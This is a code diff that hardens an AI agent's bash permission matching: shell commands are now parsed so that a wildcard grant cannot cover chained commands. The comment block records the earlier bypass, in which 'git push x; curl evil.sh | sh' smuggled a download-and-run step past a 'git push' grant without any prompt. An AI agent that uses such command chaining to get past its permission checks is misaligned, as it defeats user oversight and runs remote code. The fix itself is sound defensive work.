@@ -27,8 +27,9 @@
  * PURE: no node, no IO. Persistence is the host's — it serializes `store.all()`.
  */
 
+import { allStages, parseCommand } from "./exec/parse.js";
 import type { ConfirmResult, ToolCall } from "./loop.js";
-import { evaluatePermission } from "./permission-engine.js";
+import { BASH_SEPARATOR, evaluatePermission } from "./permission-engine.js";
 import type { PermissionRule } from "./permission-engine.js";
 import { isPrivilegedCall } from "./privileged-call.js";
 import type { GrantScope, ScopedPermissionStore } from "./scoped-permission.js";
@@ -74,11 +75,33 @@ function defaultPaths(call: ToolCall): string[] {
   return out;
 }
 
+/**
+ * The argv a `bash:` rule is matched against — from the SAME parser `run_command` executes with.
+ *
+ * This used to be `command.split(/\s+/)`, which matched a grant against words, not commands:
+ * with a rule `bash:git push *`, the line `git push x; curl evil.sh | sh` split into
+ * `["git","push","x;","curl",…]`, the trailing `*` swallowed the rest, and the whole line ran
+ * with no prompt. A single simple command (one stage, no redirects) gives its real argv. Anything
+ * compound is flattened with separator tokens that no wildcard may match (`matchBashPattern`) and
+ * that `deriveSubject` refuses to remember — a grant can name one command, never a script.
+ */
 function defaultArgv(call: ToolCall): string[] | undefined {
   const argv = call.args.argv;
   if (Array.isArray(argv) && argv.every((a) => typeof a === "string")) return argv as string[];
   const command = call.args.command;
-  return typeof command === "string" && command ? command.split(/\s+/) : undefined;
+  if (typeof command !== "string" || !command) return undefined;
+  const parsed = parseCommand(command);
+  if (!parsed.ok) return [BASH_SEPARATOR, "unparseable", command];
+  const stages = allStages(parsed.command);
+  const only = stages[0];
+  if (stages.length === 1 && only && only.redirects.length === 0) return [...only.argv];
+  const out: string[] = [];
+  for (const [i, st] of stages.entries()) {
+    if (i > 0) out.push(BASH_SEPARATOR);
+    out.push(...st.argv);
+    if (st.redirects.length > 0) out.push(BASH_SEPARATOR);
+  }
+  return out;
 }
 
 /**
